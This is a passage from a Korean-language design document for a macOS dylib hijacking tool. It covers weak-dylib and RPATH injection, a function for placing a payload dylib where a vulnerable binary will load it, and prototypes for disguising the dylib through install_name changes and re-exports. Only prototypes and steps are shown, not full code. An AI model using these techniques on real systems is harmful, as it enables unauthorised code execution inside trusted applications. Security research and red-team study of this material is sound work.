│    - 우리의 dylib을 먼저 발견!                         │
│    - 우리 dylib 로드 성공 ✓                            │
│ 4. 결과: 우리 코드 실행 + 원본 기능 bypass ✓            │
└──────────────────────────────────────────────────────────┘
```

#### **RPATH와의 차이점**

| 특성 | RPATH 취약점 | Weak Dylib 취약점 |
|------|-----------|-----------------|
| **로드 실패 처리** | 바이너리 중단 ❌ | 계속 실행 ✓ |
| **경로 제한** | @rpath만 사용 | @loader_path, 상대경로 등 |
| **배치 유연성** | 낮음 | 높음 |
| **보안** | 더 엄격 | 상대적으로 느슨함 |
| **공격 가능성** | 중간 | 높음 |

#### **구현 로직**

```c
bool inject_via_weak_dylib(
    const char *source_dylib,        // 우리의 페이로드 dylib
    const char *binary_path,         // 취약한 바이너리
    char **weak_dylibs,              // Weak Dylib 경로들
    size_t weak_dylib_count,
    const char *original_dylib_name  // 원본 dylib 이름
)
```

**동작 과정**:
1. weak dylib 경로를 실제 경로로 변환
2. 첫 번째 접근 가능한 경로에 우리의 dylib 배치
3. `install_name` 설정으로 원본처럼 보이게 함

---

## 🏗️ 파일 구조

### **핵심 모듈**

| 파일 | 역할 |
|------|------|
| `result_parser.h/c` | Scanner 결과 파싱 |
| `rpath_injector.h/c` | RPATH 취약점 주입 |
| `weak_dylib_injector.h/c` | Weak Dylib 취약점 주입 |
| `dylib_modifier.h/c` | dylib 헤더 수정 (공통 로직) |
| `main.c` | 메인 프로그램 (사용자 상호작용) |

### **dylib_modifier 제공 함수들**

```c
// dylib 파일 복사
bool copy_dylib(const char *source, const char *target);

// install_name 변경 (바이너리가 우리 dylib을 어떻게 인식할지)
bool change_install_name(const char *dylib, const char *new_name);

// install_name 읽기
char* get_dylib_install_name(const char *dylib);

// LC_REEXPORT_DYLIB 추가 (원본 dylib 재수출)
bool add_reexport_dylib(const char *dylib, const char *reexport_path);
```

---
